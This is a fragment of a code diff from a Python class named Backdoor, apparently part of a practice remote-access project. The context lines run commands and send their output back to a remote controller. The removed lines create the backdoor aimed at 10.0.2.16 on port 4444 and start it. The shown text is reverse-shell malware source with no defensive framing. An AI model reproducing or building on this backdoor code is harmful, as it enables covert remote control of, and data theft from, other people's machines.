@@ -62,6 +62,3 @@ class Backdoor:
                 command_result = "[-] Error generated during execution\n"
             
             self.reliable_send(command_result)
-
-my_backdoor = Backdoor("10.0.2.16", 4444)
-my_backdoor.run()
